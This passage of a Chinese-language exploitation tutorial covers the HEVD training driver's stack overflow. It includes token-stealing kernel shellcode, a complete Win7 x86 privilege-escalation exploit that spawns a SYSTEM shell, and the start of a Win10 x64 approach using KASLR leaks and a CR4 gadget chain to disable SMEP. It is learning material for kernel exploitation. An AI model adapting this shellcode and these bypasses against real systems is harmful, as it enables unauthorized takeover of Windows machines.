class="line">&#125;</span><br></pre></td></tr></table></figure><p>设备名字的开头需要是<code>\\.\</code>代表这是本地的一个设备,这是命名约定</p><p>然后分配一块内存用于存储我们的payload,长度也就是<code>0x81C+4+4</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">*(PULONG)MemoryAddress = (ULONG)EopPayload;</span><br></pre></td></tr></table></figure><p>在windows7_32中并没有smep这样的保护限制,所以我们可以直接在用户态写下提权的shellcode,然后在内核态下跳转到执行</p><p>使用DeviIoControl进行触发,DeviIoControl的参数就会被使用IRP包装并传递给驱动设备</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(hFile,</span><br><span class="line">                HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">                (LPVOID)UserModeBuffer,</span><br><span class="line">                (DWORD)UserModeBufferSize,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                &amp;BytesReturned,</span><br><span class="line">                <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><p>token窃取是windows内核提权十分常用的手段</p><p>在 Windows 内核中，每个进程都有一个 <code>Token</code>，它代表了该进程的安全属性，包括用户身份和权限。</p><p>当进程尝试执行某些操作时，系统会检查 <code>Token</code>，看看进程是否有权限执行该操作。</p><p>token窃取的原理就是</p><blockquote><p><code>Token</code> 是一个内核对象，进程的内核数据结构（<code>EPROCESS</code>）中包含一个指向 <code>Token</code> 的指针。</p><p>由于这个指针存储在内核内存中，如果我们能在内核模式下修改这个指针，就可以让当前进程“冒充”另一个进程，比如 <code>System</code> 进程，从而获得 <code>NT AUTHORITY\SYSTEM</code> 权限。</p></blockquote><p>接下来的提权利用就依赖这个方法</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>回过头来看HEVD提权的shellcode</p><p>EopPayload实际上就是TokenStealingPayloadWin7函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">VOID TokenStealingPayloadWin7() &#123;</span><br><span class="line">    // Importance of Kernel Recovery</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad                               ; Save registers state</span><br><span class="line"></span><br><span class="line">        ; Start of Token Stealing Stub</span><br><span class="line">        xor eax, eax                         ; Set ZERO</span><br><span class="line">        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                             ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"></span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"></span><br><span class="line">        mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"></span><br><span class="line">        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"></span><br><span class="line">        SearchSystemPID:</span><br><span class="line">            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                             ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        ; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">        popad                                ; Restore registers state</span><br><span class="line"></span><br><span class="line">        ; Kernel Recovery Stub</span><br><span class="line">        xor eax, eax                         ; Set NTSTATUS SUCCEESS</span><br><span class="line">        add esp, 12                          ; Fix the stack</span><br><span class="line">        pop ebp                              ; Restore saved EBP</span><br><span class="line">        ret 8                                ; Return cleanly</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段shellcode做的就是循环遍历进程,并将系统system进程的token替换给当前进程</p><p>在 Windows 操作系统中，<code>FS</code> 寄存器在用户态和内核态指向不同的内存区域</p><p>用户态<code>FS</code> 寄存器指向 <strong>线程环境块（TEB，Thread Environment Block）</strong></p><p>内核态<code>FS</code> 寄存器指向 <strong>处理器控制区域（KPCR，Kernel Processor Control Region）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; dt nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Used_StackBase   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> Spare2           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> TssCopy          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> ContextSwitches  : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> SetMemberCopy    : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Used_Self        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x024</span> Irql             : UChar</span><br><span class="line">   +<span class="number">0x028</span> IRR              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> IrrActive        : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> IDR              : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x038</span> IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +<span class="number">0x03c</span> GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +<span class="number">0x040</span> TSS              : Ptr32 _KTSS</span><br><span class="line">   +<span class="number">0x044</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x046</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x048</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> StallScaleFactor : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> SpareUnused      : UChar</span><br><span class="line">   +<span class="number">0x051</span> Number           : UChar</span><br><span class="line">   +<span class="number">0x052</span> Spare0           : UChar</span><br><span class="line">   +<span class="number">0x053</span> SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +<span class="number">0x054</span> VdmAlert         : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> KernelReserved   : [<span class="number">14</span>] Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SecondLevelCacheSize : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> InterruptMode    : Uint4B</span><br><span class="line">   +<span class="number">0x0d8</span> Spare1           : UChar</span><br><span class="line">   +<span class="number">0x0dc</span> KernelReserved2  : [<span class="number">17</span>] Uint4B</span><br><span class="line">   +<span class="number">0x120</span> PrcbData         : _KPRCB</span><br><span class="line">       </span><br><span class="line"><span class="number">3</span>: kd&gt; dt _KPRCB</span><br><span class="line">nt!_KPRCB</span><br><span class="line">   +<span class="number">0x000</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : Ptr32 _KTHREAD</span><br></pre></td></tr></table></figure><p>首先从KPCR的0x124偏移处获取CurrentThread</p><p>再从CurrentThread的0x50偏移处获取Eprocess的地址,并保存此时的Eprocess地址</p><p>windows的system的进程ID一般都是0x4</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_151441.png" alt=""></p><p>在_EPROCESS的0xb8处有一个ActiveProcessLinks字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x0b4</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   +<span class="number">0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   +<span class="number">0x0f8</span> Token            : _EX_FAST_REF</span><br></pre></td></tr></table></figure><p>用于链接所有的进程结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _LIST_ENTRY</span><br><span class="line">nt!_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRY</span><br></pre></td></tr></table></figure><p>这样不停的遍历直到找到PID为4的system则进行提权操作,提权操作就是将此时system的Token字段复制到此前保存的进程结构中完成提权</p><p>综上我们可以写出一份简单且完整的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="type">void</span> <span class="title function_">shellcode</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm &#123;</span><br><span class="line">    pushad</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov eax, dword ptr fs : [eax + <span class="number">124</span>h]</span><br><span class="line">    mov eax, dword ptr[eax + <span class="number">50</span>h]</span><br><span class="line">    mov ecx, eax</span><br><span class="line">    mov edx, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">SearchSystemPID :</span><br><span class="line">    mov eax, dword ptr[eax + <span class="number">0B</span>8h]</span><br><span class="line">    sub eax, <span class="number">0B</span>8h</span><br><span class="line">    cmp dword ptr[eax + <span class="number">0B</span>4h], edx</span><br><span class="line">    jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">    mov edx, dword ptr[eax + <span class="number">0F</span>8h]</span><br><span class="line">    mov dword ptr[ecx + <span class="number">0F</span>8h], edx</span><br><span class="line">    popad</span><br><span class="line">    xor eax, eax</span><br><span class="line">    pop ebp</span><br><span class="line">    ret <span class="number">8</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">0x824</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="keyword">if</span> (uBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc failed with error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  *(ULONG_PTR*)((BYTE*)uBuffer + bufSize - <span class="keyword">sizeof</span>(ULONG_PTR)) = (ULONG_PTR)shellcode;</span><br><span class="line">  ULONG BytesReturned;</span><br><span class="line">  DeviceIoControl(hDriver,</span><br><span class="line">    <span class="number">0x222003</span>,</span><br><span class="line">    (LPVOID)uBuffer,</span><br><span class="line">    (DWORD)bufSize,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &amp;BytesReturned,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>Windows系统在<strong>Windows 8</strong>和<strong>Windows Server 2012</strong>中首次引入了SMEP（Supervisor Mode Execution Protection）保护机制。SMEP通过硬件支持（如Intel的SMEP功能）防止内核模式代码执行用户空间的内存，增强了系统的安全性，减少了内核漏洞的利用风险。</p><p>在win7_32的环境下,由于没有smep的存在,我们直接将程序的执行流控制到用户态执行shellcode即可完成提权操作</p><p>但这招在win10_x64下显然没有办法成功,那么该如何利用这个漏洞呢</p><p>两个方法:</p><ol><li>通过将CR4寄存器的第20位置零,关闭smep保护</li><li>不与用户空间产生交际,完全在内核空间完成提权</li></ol><p>第二种方法我们则要么能够在内核空间中找到一个可写可执行的位置,或者完全利用gadget进行提权(这显然更难)</p><p>而如果是第一种方法,如果开启了kpti保护那又更难办,kpti的作用是隔离内核页表与用户页表,然而基于x86_64的实现同时也会在内核态时将用户空间标记为不可执行</p><p>这里我们就不难为自己了,就按照默认设置中的无kpti保护</p><h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p>两种方法还都受着Kaslr的影响,那么一步一步来,先让我们开始解决Kaslr</p><p>解决kaslr的方法无论win还是linux,内核态还是用户态,无非就是泄露内存地址并减去偏移得到基址</p><p>在linux下这可能很麻烦,例如需要uaf等漏洞控制特殊结构体,并以此泄露残留指针等</p><p>但我们此时是windows, Windows 中有一个安全机制称为<strong>完整性级别（Integrity Level）</strong> ，用于限制进程对系统资源的访问权限</p><p>只要我们拥有<strong>中完整性级别(普通用户默认启动应用程序所在级别)</strong>,windows就会开放一些十分有用API给我们</p><p><code>EnumDeviceDrivers</code> 函数存在于 <code>psapi.h</code> 中，可以枚举所有设备驱动程序，包括内核本身，并给出设备驱动程序的基址。它将返回一个设备驱动程序列表，其中第一个就是内核本身</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">EnumDeviceDrivers</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPVOID  *lpImageBase,<span class="comment">//接收设备驱动程序地址的缓冲区</span></span></span><br><span class="line"><span class="params">  DWORD   cb,<span class="comment">//缓冲区大小</span></span></span><br><span class="line"><span class="params">  LPDWORD lpcbNeeded<span class="comment">//返回实际需要的字节数</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>写一个验证案例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintDeviceDrivers</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 缓冲区用于存储设备驱动程序的地址</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;LPVOID&gt; <span class="title function_">drivers</span><span class="params">(<span class="number">1024</span>)</span>;</span><br><span class="line">  DWORD bytesNeeded;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 枚举设备驱动程序</span></span><br><span class="line">  <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果缓冲区不足，则调整大小并重新调用</span></span><br><span class="line">  <span class="keyword">if</span> (bytesNeeded &gt; drivers.size() * <span class="keyword">sizeof</span>(LPVOID)) &#123;</span><br><span class="line">    drivers.resize(bytesNeeded / <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line">    <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed after resizing. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打印设备驱动程序信息</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loaded Device Drivers:\n&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; bytesNeeded / <span class="keyword">sizeof</span>(LPVOID); ++i) &#123;</span><br><span class="line">    TCHAR driverName[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], driverName, MAX_PATH)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::wcout &lt;&lt; <span class="string">L&quot;Driver: &quot;</span> &lt;&lt; driverName &lt;&lt; <span class="string">L&quot; at address &quot;</span> &lt;&lt; drivers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to get driver name. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  PrintDeviceDrivers();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_164121.png" alt=""></p><p><code>ntoskrnl.exe</code>就是内核的核心组件,它的加载基址就是windows内核代码段的加载基址</p><p>是的,令人头大的Kaslr保护就这样被轻而易举破解了</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><p>现在让我们尝试第一种解决方案,在<code>ntoskrnl.exe</code>中有这样的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rcx; ret;</span><br><span class="line">mov cr4, rcx; ret;</span><br></pre></td></tr></table></figure><p>那么我们就完全有能力修改CR4寄存器</p><p>通过windbg观察常规状态下cr4寄存器的值</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_212449.png" alt=""></p><p>第20位处的值是1,也就代表开启了smep保护,所以需要将其关闭,让后跳转到用户内存执行shellcode</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>win10_x64的内核提权shellcode本质上与win7_x32下区别并不太大,但依然会有一些区别</p><p>这里依然采用常见的token窃取提权方式,不过针对win10_x64环境需要对shellcode做出一些改变</p><p>在github上找到一段有效的shellcoe<a href="https://github.com/Kristal-g/kristal-g.github.io/blob/master/assets/code/shellcode_fix_stack_pivot.asm">kristal-g.github.io/assets/code/shellcode_fix_stack_pivot.asm at master · Kristal-g/kristal-g.github.io</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">SECTION .start_magic     </span><br><span class="line">db &quot;magic1&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECTION .text</span><br><span class="line">;db 0xcc</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">xor rax, rax</span><br><span class="line">mov rax, [gs:rax + 188h]; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">mov rax, [rax+0xb8]; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">mov r9, rax;; Backup target EPROCESS at r9</span><br><span class="line"></span><br><span class="line">; loop processes 